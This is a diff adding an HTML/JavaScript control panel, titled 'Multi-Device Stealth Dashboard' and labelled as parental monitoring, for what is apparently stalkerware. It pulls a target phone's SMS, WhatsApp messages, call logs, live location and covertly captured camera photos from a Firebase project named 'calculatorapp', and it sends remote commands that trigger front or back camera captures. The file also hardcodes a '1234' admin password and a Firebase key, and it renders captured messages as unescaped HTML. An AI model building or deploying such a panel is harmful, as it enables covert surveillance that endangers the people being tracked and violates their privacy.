@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Multi-Device Stealth Dashboard</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
+</head>
+<body class="bg-gray-900 text-white min-h-screen">
+
+    <div id="auth-screen" class="flex items-center justify-center h-screen">
+        <div class="bg-gray-800 p-8 rounded-lg shadow-lg w-96">
+            <h2 class="text-xl font-bold mb-4 text-center">🔐 Admin Login</h2>
+            <input type="password" id="password-input" placeholder="Enter Password" class="w-full p-3 rounded bg-gray-700 border border-gray-600 text-white mb-4 focus:outline-none">
+            <button onclick="checkPassword()" class="w-full bg-orange-600 hover:bg-orange-700 text-white font-semibold py-3 rounded">Login</button>
+        </div>
+    </div>
+
+    <div id="dashboard-screen" class="max-w-6xl mx-auto p-4 hidden">
+        <header class="flex justify-between items-center border-b border-gray-700 pb-4 mb-6">
+            <h1 class="text-2xl font-bold flex items-center gap-2">🛡️ Multi-Device Parental Dashboard</h1>
+            <button onclick="logout()" class="text-sm bg-red-600 hover:bg-red-700 px-3 py-1 rounded">Logout</button>
+        </header>
+
+        <!-- 📲 Target Device & Controls -->
+        <div class="bg-gray-800 rounded-lg p-6 mb-6">
+            <h2 class="text-lg font-bold mb-3 text-yellow-400">🎮 Select Target Device & Remote Controls</h2>
+            <div class="flex flex-wrap items-center gap-4">
+                <select id="device-select" class="bg-gray-700 text-white p-2.5 rounded border border-gray-600 font-semibold focus:outline-none">
+                    <option value="">-- Select Device --</option>
+                </select>
+
+                <button onclick="sendRemoteCommand('capture_photo_front')" class="bg-blue-600 hover:bg-blue-700 px-4 py-2 rounded text-sm font-semibold">📸 Front Photo</button>
+                <button onclick="sendRemoteCommand('capture_photo_back')" class="bg-indigo-600 hover:bg-indigo-700 px-4 py-2 rounded text-sm font-semibold">📷 Back Photo</button>
+                <button onclick="sendRemoteCommand('request_location')" class="bg-teal-600 hover:bg-teal-700 px-4 py-2 rounded text-sm font-semibold">📍 Get Live Location</button>
+            </div>
+        </div>
+
+        <!-- 🖼️ Photos -->
+        <div class="bg-gray-800 rounded-lg p-6 mb-6">
+            <h2 class="text-xl font-semibold mb-4 text-emerald-400">🖼️ Captured Photos</h2>
+            <div id="media-container" class="grid grid-cols-1 md:grid-cols-3 gap-4">
+                <p class="text-gray-500">No photos found for this device.</p>
+            </div>
+        </div>
+
+        <!-- 📍 Location -->
+        <div class="bg-gray-800 rounded-lg p-6 mb-6">
+            <h2 class="text-xl font-semibold text-blue-400 mb-2">📍 Latest Location (Last Updated)</h2>
+            <div id="location-box" class="text-gray-300">Fetching location...</div>
+        </div>
+
+        <!-- Logs Grid -->
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+            <div class="bg-gray-800 rounded-lg p-6">
+                <h2 class="text-xl font-semibold mb-4 text-purple-400">📱 SMS Logs</h2>
+                <div id="sms-box" class="text-gray-300 text-sm space-y-2 max-h-60 overflow-y-auto">Loading...</div>
+            </div>
+            <div class="bg-gray-800 rounded-lg p-6">
+                <h2 class="text-xl font-semibold mb-4 text-green-400">💬 WhatsApp Logs</h2>
+                <div id="whatsapp-box" class="text-gray-300 text-sm space-y-2 max-h-60 overflow-y-auto">Loading...</div>
+            </div>
+            <div class="bg-gray-800 rounded-lg p-6">
+                <h2 class="text-xl font-semibold mb-4 text-yellow-400">📞 Call Logs</h2>
+                <div id="call-box" class="text-gray-300 text-sm space-y-2 max-h-60 overflow-y-auto">Loading...</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const ADMIN_PASSWORD = "1234";
+        let db;
+
+        function checkPassword() {
+            if (document.getElementById('password-input').value === ADMIN_PASSWORD) {
+                document.getElementById('auth-screen').classList.add('hidden');
+                document.getElementById('dashboard-screen').classList.remove('hidden');
+                initFirebase();
+            } else {
+                alert('Wrong Password!');
+            }
+        }
+
+        function logout() { location.reload(); }
+
+        function initFirebase() {
+            const firebaseConfig = {
+                apiKey: "AIzaSyBj20CcchbNqzUmiQo7gVcFvEgCXT_-AA4",
+                authDomain: "calculatorapp-44d90.firebaseapp.com",
+                projectId: "calculatorapp-44d90",
+                storageBucket: "calculatorapp-44d90.appspot.com",
+                messagingSenderId: "659953474145",
+                appId: "1:659953474145:web:2fef467a200ee091d9a820"
+            };
+
+            firebase.initializeApp(firebaseConfig);
+            db = firebase.firestore();
+
+            loadDeviceList();
+            document.getElementById('device-select').addEventListener('change', loadDashboardData);
+        }
+
+        function loadDeviceList() {
+            let devices = new Set();
+            let collections = ['call_logs_v2', 'sms_logs_v2', 'whatsapp_logs_v2', 'device_location_v2', 'media_logs_v2'];
+            
+            let loadedCount = 0;
+            collections.forEach(col => {
+                db.collection(col).get().then(snapshot => {
+                    snapshot.forEach(doc => {
+                        let d = doc.data();
+                        if (d.device_name) {
+                            devices.add(d.device_name);
+                        }
+                    });
+                    loadedCount++;
+                    if (loadedCount === collections.length) {
+                        updateDeviceDropdown(Array.from(devices));
+                    }
+                }).catch(() => {
+                    loadedCount++;
+                });
+            });
+        }
+
+        function updateDeviceDropdown(deviceList) {
+            let select = document.getElementById('device-select');
+            select.innerHTML = "";
+            if (deviceList.length === 0) {
+                select.innerHTML = `<option value="">No devices found</option>`;
+                return;
+            }
+            deviceList.forEach(dev => {
+                let opt = document.createElement('option');
+                opt.value = dev;
+                opt.textContent = "📱 " + dev;
+                select.appendChild(opt);
+            });
+            loadDashboardData();
+        }
+
+        function loadDashboardData() {
+            let targetDev = document.getElementById('device-select').value;
+            if (!targetDev) return;
+
+            // Photos (v2)
+            db.collection('media_logs_v2').orderBy('timestamp', 'desc').onSnapshot(snapshot => {
+                let html = "";
+                snapshot.forEach(doc => {
+                    let d = doc.data();
+                    if (d.device_name === targetDev && d.type === 'photo') {
+                        html += `<div class="bg-gray-700 p-2 rounded"><img src="${d.url}" class="w-full rounded mb-1"><p class="text-xs text-gray-400">📸 Photo</p></div>`;
+                    }
+                });
+                document.getElementById('media-container').innerHTML = html || "<p class='text-gray-500'>No photos found for this device.</p>";
+            });
+
+            // Location (v2)
+            db.collection('device_location_v2').orderBy('timestamp', 'desc').limit(1).onSnapshot(snapshot => {
+                let found = false;
+                snapshot.forEach(doc => {
+                    let d = doc.data();
+                    if (d.device_name === targetDev) {
+                        found = true;
+                        let timeStr = d.timestamp ? new Date(d.timestamp.toDate()).toLocaleString() : 'Just now';
+                        document.getElementById('location-box').innerHTML = `Latitude: ${d.latitude}, Longitude: ${d.longitude} <br><span class="text-xs text-yellow-400">🕒 Last Updated: ${timeStr}</span><br><a href="https://maps.google.com/?q=${d.latitude},${d.longitude}" target="_blank" class="text-blue-400 underline mt-1 inline-block">View on Google Maps</a>`;
+                    }
+                });
+                if (!found) document.getElementById('location-box').innerHTML = "No location data found.";
+            });
+
+            // SMS (v2)
+            db.collection('sms_logs_v2').orderBy('timestamp', 'desc').onSnapshot(snapshot => {
+                let html = "";
+                snapshot.forEach(doc => {
+                    let d = doc.data();
+                    if (d.device_name === targetDev) {
+                        html += `<div class="border-b border-gray-700 pb-2"><b>${d.sender}:</b> ${d.message}</div>`;
+                    }
+                });
+                document.getElementById('sms-box').innerHTML = html || "<p class='text-gray-500'>No SMS messages.</p>";
+            });
+
+            // WhatsApp (v2)
+            db.collection('whatsapp_logs_v2').orderBy('timestamp', 'desc').onSnapshot(snapshot => {
+                let html = "";
+                snapshot.forEach(doc => {
+                    let d = doc.data();
+                    if (d.device_name === targetDev) {
+                        html += `<div class="border-b border-gray-700 pb-2"><b>${d.sender}:</b> ${d.message}</div>`;
+                    }
+                });
+                document.getElementById('whatsapp-box').innerHTML = html || "<p class='text-gray-500'>No WhatsApp messages.</p>";
+            });
+
+            // Call Logs (v2)
+            db.collection('call_logs_v2').orderBy('timestamp', 'desc').onSnapshot(snapshot => {
+                let html = "";
+                snapshot.forEach(doc => {
+                    let d_data = doc.data();
+                    if (d_data.device_name === targetDev) {
+                        let timeStr = d_data.timestamp ? new Date(d_data.timestamp.toDate()).toLocaleString() : '';
+                        html += `<div class="border-b border-gray-700 pb-2"><b>${d_data.name}</b> (${d_data.number})<br><span class="text-xs text-gray-400">Type: ${d_data.type} | Duration: ${d_data.duration}s</span><br><span class="text-xs text-yellow-400">🕒 ${timeStr}</span></div>`;
+                    }
+                });
+                document.getElementById('call-box').innerHTML = html || "<p class='text-gray-500'>No call logs.</p>";
+            });
+        }
+
+        function sendRemoteCommand(actionName) {
+            let selectedDevice = document.getElementById('device-select').value;
+            if (!selectedDevice) {
+                alert("Please select a device first!");
+                return;
+            }
+            db.collection('commands').doc(selectedDevice).set({
+                action: actionName,
+                requestedAt: firebase.firestore.FieldValue.serverTimestamp()
+            }).then(() => {
+                alert(`Command '${actionName}' sent to ${selectedDevice}!`);
+            });
+        }
+    </script>
+</body>
+</html>
